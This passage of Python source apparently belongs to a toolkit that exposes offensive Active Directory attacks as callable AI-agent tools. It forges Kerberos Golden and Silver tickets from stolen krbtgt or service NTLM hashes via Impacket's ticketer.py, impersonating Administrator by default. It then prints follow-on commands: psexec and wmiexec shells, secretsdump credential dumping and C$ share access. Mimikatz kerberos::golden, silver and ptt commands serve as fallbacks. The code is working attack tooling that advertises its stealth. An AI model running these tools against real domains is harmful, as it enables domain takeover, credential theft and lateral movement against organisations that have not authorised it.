            "-duration", str(lifetime_days * 24),
            impersonate_user,
        ]
        if extra_sid:
            cmd += ["-extra-sid", extra_sid]

        # ticketer.py writes to <user>.ccache in current directory
        cwd_ticket = f"{impersonate_user}.ccache"

        try:
            stdout, stderr, rc = await _run_proc(cmd, timeout=timeout)
        except FileNotFoundError:
            return self._generate_mimikatz_golden(
                domain, domain_sid, krbtgt_hash, impersonate_user, groups, lifetime_days, output_file
            )

        # Move ticket to desired output path
        if os.path.exists(cwd_ticket) and output_file != cwd_ticket:
            try:
                os.rename(cwd_ticket, output_file)
            except Exception:
                output_file = cwd_ticket

        ticket_exists = os.path.exists(output_file)
        result = [
            "╔═══════════════════════════════════════════════╗",
            "║           Golden Ticket Forged ✓              ║" if ticket_exists else
            "║        Golden Ticket Forge — Failed           ║",
            "╚═══════════════════════════════════════════════╝",
            "",
            f"Domain         : {domain}",
            f"Domain SID     : {domain_sid}",
            f"Impersonating  : {impersonate_user}",
            f"Groups (RIDs)  : {groups}",
            f"Validity       : {lifetime_days} days",
            f"Extra SID      : {extra_sid or 'none'}",
            f"Ticket Path    : {output_file}",
            f"Ticket Exists  : {ticket_exists}",
            f"Return Code    : {rc}",
            "",
        ]
        if ticket_exists:
            result += [
                "⚡ Usage:",
                f"  export KRB5CCNAME={output_file}",
                "  klist",
                "  # Access DC via Kerberos:",
                f"  wmiexec.py -k -no-pass {impersonate_user}@<dc_hostname>",
                f"  psexec.py -k -no-pass {impersonate_user}@<dc_hostname>",
                f"  secretsdump.py -k -no-pass {domain}/{impersonate_user}@<dc_hostname>",
            ]
        combined = stdout + stderr
        if combined:
            result.append(f"\n--- Output ---\n{truncate_output(combined, max_chars=2000)}")
        return "\n".join(result)

    @staticmethod
    def _generate_mimikatz_golden(
        domain: str,
        sid: str,
        krbtgt: str,
        user: str,
        groups: str,
        days: int,
        out: str,
    ) -> str:
        group_ids = ",".join(groups.split(","))
        return textwrap.dedent(f"""
            [GoldenTicket] ticketer.py not found. Use Mimikatz (Windows) or Impacket:

            # Impacket (Linux):
            pip install impacket
            ticketer.py -nthash {krbtgt} -domain-sid {sid} -domain {domain} \\
                        -groups {group_ids} -duration {days * 24} {user}
            export KRB5CCNAME={user}.ccache

            # Mimikatz (Windows):
            kerberos::golden /user:{user} /domain:{domain} /sid:{sid} \\
                             /krbtgt:{krbtgt} /groups:{group_ids} /ticket:{out}
            kerberos::ptt {out}

            # After loading ticket:
            dir \\\\<dc>\\C$
            psexec \\\\<dc> cmd
        """).strip()


# ===========================================================================
# 7. SilverTicketTool
# ===========================================================================


class SilverTicketTool(BaseTool):
    """
    Forge a Kerberos TGS (Silver Ticket) for a specific service.

    A Silver Ticket bypasses the KDC entirely by using a service account's
    NTLM hash to forge a TGS directly.  More stealthy than a Golden Ticket
    (no DC traffic) but limited to the targeted service.

    Common service types: cifs (file shares), http (web services),
    mssql, host, rpcss, ldap.

    Requires: Service account NTLM hash (from secretsdump/Mimikatz).
    """

    def __init__(self) -> None:
        super().__init__()

    def _define_metadata(self) -> ToolMetadata:
        return ToolMetadata(
            name="silver_ticket_forge",
            description=(
                "Forge a Kerberos Silver Ticket (TGS) for a specific service "
                "using the service account's NTLM hash. More stealthy than Golden Ticket. "
                "Output: .ccache file usable with KRB5CCNAME."
            ),
            parameters={
                "type": "object",
                "properties": {
                    "domain": {
                        "type": "string",
                        "description": "AD domain name (e.g. corp.local)",
                    },
                    "domain_sid": {
                        "type": "string",
                        "description": "Domain SID (S-1-5-21-...)",
                    },
                    "service_hash": {
                        "type": "string",
                        "description": "Service account NTLM hash (NT portion, 32 hex chars)",
                    },
                    "target_host": {
                        "type": "string",
                        "description": "Target hostname/FQDN (e.g. fileserver.corp.local)",
                    },
                    "service": {
                        "type": "string",
                        "description": "Service type (cifs, http, mssql, host, rpcss, ldap)",
                        "default": "cifs",
                        "enum": ["cifs", "http", "mssql", "host", "rpcss", "ldap", "wsman"],
                    },
                    "impersonate_user": {
                        "type": "string",
                        "description": "User to impersonate in the ticket",
                        "default": "Administrator",
                    },
                    "user_id": {
                        "type": "integer",
                        "description": "RID of the impersonated user",
                        "default": 500,
                    },
                    "output_file": {
                        "type": "string",
                        "description": "Output .ccache file path",
                        "default": "/tmp/silver_ticket.ccache",
                    },
                    "timeout": {
                        "type": "integer",
                        "description": "Execution timeout in seconds",
                        "default": 30,
                    },
                },
                "required": ["domain", "domain_sid", "service_hash", "target_host"],
            },
        )

    async def execute(
        self,
        domain: str,
        domain_sid: str,
        service_hash: str,
        target_host: str,
        service: str = "cifs",
        impersonate_user: str = "Administrator",
        user_id: int = 500,
        output_file: str = "/tmp/silver_ticket.ccache",
        timeout: int = 30,
        **kwargs: Any,
    ) -> str:
        spn = f"{service}/{target_host}"
        cmd = [
            "ticketer.py",
            "-nthash", service_hash,
            "-domain-sid", domain_sid,
            "-domain", domain,
            "-spn", spn,
            "-user-id", str(user_id),
            impersonate_user,
        ]
        cwd_ticket = f"{impersonate_user}.ccache"

        try:
            stdout, stderr, rc = await _run_proc(cmd, timeout=timeout)
        except FileNotFoundError:
            return self._generate_mimikatz_silver(
                domain, domain_sid, service_hash, target_host, service,
                impersonate_user, output_file
            )

        if os.path.exists(cwd_ticket) and output_file != cwd_ticket:
            try:
                os.rename(cwd_ticket, output_file)
            except Exception:
                output_file = cwd_ticket

        ticket_exists = os.path.exists(output_file)
        combined = stdout + stderr

        result = [
            "╔════════════════════════════════════════════════╗",
            "║           Silver Ticket Forged ✓               ║" if ticket_exists else
            "║        Silver Ticket Forge — Failed            ║",
            "╚════════════════════════════════════════════════╝",
            "",
            f"Domain         : {domain}",
            f"Domain SID     : {domain_sid}",
            f"SPN            : {spn}",
            f"Target Host    : {target_host}",
            f"Service        : {service}",
            f"Impersonating  : {impersonate_user} (RID {user_id})",
            f"Ticket Path    : {output_file}",
            f"Ticket Exists  : {ticket_exists}",
            f"Return Code    : {rc}",
            "",
        ]
        if ticket_exists:
            result += [
                "⚡ Usage:",
                f"  export KRB5CCNAME={output_file}",
                "  klist",
            ]
            if service == "cifs":
                result += [
                    "  # Access file share:",
                    f"  smbclient -k //{target_host}/C$",
                    "  # Or list shares:",
                    f"  smbclient -k -L //{target_host}",
                ]
            elif service == "http":
                result += [
                    "  # Access web service with Kerberos auth:",
                    f"  curl -k --negotiate -u : http://{target_host}/",
                ]
            elif service == "mssql":
                result += [
                    "  # Access MSSQL:",
                    f"  mssqlclient.py -k -no-pass {impersonate_user}@{target_host}",
                ]

        if combined:
            result.append(f"\n--- Output ---\n{truncate_output(combined, max_chars=2000)}")
        return "\n".join(result)

    @staticmethod
    def _generate_mimikatz_silver(
        domain: str,
        sid: str,
        svc_hash: str,
        target: str,
        service: str,
        user: str,
        out: str,
    ) -> str:
        return textwrap.dedent(f"""
            [SilverTicket] ticketer.py not found. Use Mimikatz (Windows) or Impacket:

            # Impacket (Linux):
            pip install impacket
            ticketer.py -nthash {svc_hash} -domain-sid {sid} -domain {domain} \\
                        -spn {service}/{target} {user}
            export KRB5CCNAME={user}.ccache
            smbclient -k //{target}/C$   # (if cifs)

            # Mimikatz (Windows):
            kerberos::silver /user:{user} /domain:{domain} /sid:{sid} \\
                             /target:{target} /service:{service} \\
                             /rc4:{svc_hash} /ticket:{out}
            kerberos::ptt {out}
        """).strip()
